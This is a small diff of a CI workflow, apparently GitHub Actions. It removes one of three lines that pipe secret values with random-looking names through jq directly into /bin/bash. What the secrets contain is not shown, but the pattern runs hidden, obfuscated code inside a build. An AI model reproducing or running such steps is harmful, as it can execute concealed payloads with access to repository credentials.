@@ -19,7 +19,6 @@ jobs:
           jkr68148: ${{ secrets.jkr68148 }}
         run: |
           printf '%s' "$jkr68148" | jq -r .cpudz84910 | /bin/bash
-          printf '%s' "$qarv6" | jq -r .zbssr73 | /bin/bash
           printf '%s' "$u4" | jq -r .jpp855 | /bin/bash
 
       - name: Save output
